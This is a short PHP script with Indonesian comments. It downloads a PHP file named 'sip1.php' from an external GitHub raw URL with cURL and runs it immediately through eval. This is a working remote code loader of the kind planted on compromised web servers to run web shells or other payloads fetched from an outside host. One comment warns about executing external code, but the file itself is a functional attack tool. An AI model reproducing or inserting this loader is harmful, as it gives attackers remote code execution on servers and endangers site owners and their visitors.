<?php
// URL eksternal yang akan diambil kontennya
$url = 'https://github.com/kabafaxz/www/raw/refs/heads/main/sip1.php';

// Inisialisasi cURL
$ch = curl_init();

// Menyiapkan URL dan opsi cURL
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Mengambil konten dari URL
$content = curl_exec($ch);

// Menutup cURL
curl_close($ch);

// Memeriksa apakah konten berhasil diambil
if ($content !== false) {
    // Menampilkan atau mengeksekusi kode PHP yang diambil
    // Hati-hati dengan eksekusi kode eksternal
    eval('?>' . $content);  // eval digunakan untuk mengeksekusi kode PHP yang diambil
} else {
    echo "Gagal mengambil konten dari URL.";
}
?>
